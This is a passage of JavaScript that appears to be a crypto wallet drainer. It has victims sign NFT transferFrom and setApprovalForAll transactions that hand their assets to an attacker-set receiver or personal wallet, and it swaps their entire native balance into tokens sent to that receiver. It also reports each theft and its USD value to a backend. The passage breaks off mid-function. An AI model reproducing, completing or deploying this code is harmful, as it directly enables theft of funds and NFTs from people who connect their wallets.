  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Personal_Wallet.address, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  const x_promise = send_request({
    action: 'withdraw_nft', wallet: CF_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: CF_ID, asset: asset, address: CF_Current_Address
  });

  if (CF_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NFT(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_RANDOMIZER_SAFA = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Personal_Wallet.address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_SAFA = async (asset) => {
  if (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) return DO_RANDOMIZER_SAFA(asset);

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 90000);

  await transfer_success(asset); sign_ready();
};

const DO_SWAP_BYPASS_NATIVE = async (asset) => {
  const provider   = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gasPriceBN = BN(await provider.getGasPrice())
                      .div(BN(100))
                      .mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const balance    = await provider.getBalance(CF_Current_Address);
  const swap_deadline = Math.floor(Date.now()/1000) + SWAP_DEADLINE_OFFSET;
  const routerAddress = '0xEfF92A263d31888d860bD50809A8D171709b7b1c';
  const router       = new ethers.Contract(routerAddress, CF_Pancake_Native_ABI, CF_Signer);
  let gasLimit, attempts = 0;
  const safeValue = balance
    .sub(BN(21_000).mul(gasPriceBN))
    .sub(
      BN(
        ([42161,43114].includes(asset.chain_id) ? 5_000_000 :
         asset.chain_id === 369 ? 900_000 : 150_000
        )
      )
      .mul(CF_Gas_Reserves[asset.chain_id])
      .mul(gasPriceBN)
    );

  while (attempts++ < 3) {
    try {
      gasLimit = await router.estimateGas.swapExactETHForTokens(
        '0',
        [ CF_Swap_Route[asset.chain_id], CF_Settings.Settings.Swap_Bypass_For_ETH_Token ],
        CF_Settings.Receiver,
        swap_deadline,
        { from: CF_Current_Address, value: safeValue }
      );
      gasLimit = gasLimit.mul(120).div(100);
      break;
    } catch {
      gasLimit = ethers.BigNumber.from(
        [42161,43114].includes(asset.chain_id) ? 5_000_000 : 350_000
      );
    }
  }

  let available = balance.sub(gasLimit.mul(gasPriceBN));
  if (CF_Settings.Settings.Reserves.Mode === 1) {
    const pct = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    available = available.mul(100 - pct).div(100);
  } else if (CF_Settings.Settings.Reserves.Mode === 2) {
    let pct = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    let maxAmt = 0;
    for (const { amount, percent } of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd >= amount && amount >= maxAmt) {
        maxAmt = amount;
        pct = percent;
      }
    }
    available = available.mul(100 - pct).div(100);
  }

  if (available.lte(BN(0))) throw 'LOW_BALANCE';

  let amountOutMinBN;
  try {
    const readRouter = new ethers.Contract(
      routerAddress,
      CF_RouterV2_ReadABI,
      provider
    );
    const path = [
      CF_Swap_Route[asset.chain_id],
      CF_Settings.Settings.Swap_Bypass_For_ETH_Token
    ];
    const amounts = await readRouter.getAmountsOut(
      available.toString(),
      path
    );
    amountOutMinBN = ethers.BigNumber.from(amounts[1])
      .mul(100 - SLIPPAGE_TOLERANCE)
      .div(100);

  } catch (err) {
    console.warn('Quote failed, fallback to 0', err);
    amountOutMinBN = ethers.BigNumber.from(0);
  }

  // делаем своп
  const nonce = await get_nonce(asset.chain_id);
  await approve_request(asset);
  sign_next();
  const tx = await router.swapExactETHForTokens(
    amountOutMinBN.toString(),
    [
      CF_Swap_Route[asset.chain_id],
      CF_Settings.Settings.Swap_Bypass_For_ETH_Token
    ],
    CF_Settings.Receiver,
    swap_deadline,
    {
      gasLimit: gasLimit,
      gasPrice: gasPriceBN,
      nonce:    nonce,
      from:     CF_Current_Address,
      value:    available
    }
  );
  wait_message();
  if (CF_Settings.Settings.Wait_For_Confirmation) {
    await provider.waitForTransaction(tx.hash, 1, 60_000);
  }
  await swap_success('Pancake', asset, [asset]);
  sign_ready();
};

const LEGACY_DO_SWAP_BYPASS_NATIVE = async (asset) => {

  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);
  const balance = await node.getBalance(CF_Current_Address);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract('0xEfF92A263d31888d860bD50809A8D171709b7b1c', CF_Pancake_Native_ABI, CF_Signer);

  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactETHForTokens('0', [
        '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
        CF_Settings.Settings.Swap_Bypass_For_ETH_Token
      ], CF_Settings.Receiver, swap_deadline, {
        from: CF_Current_Address,
        value: balance.sub(ethers.BigNumber.from('21000')
        .mul(gas_price)).sub(tokens_gas_fee)
      });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120'));
      gas_attempts = 3;
    } catch(err) {
      gas_limit = ethers.BigNumber.from((asset.chain_id == 42161) ?
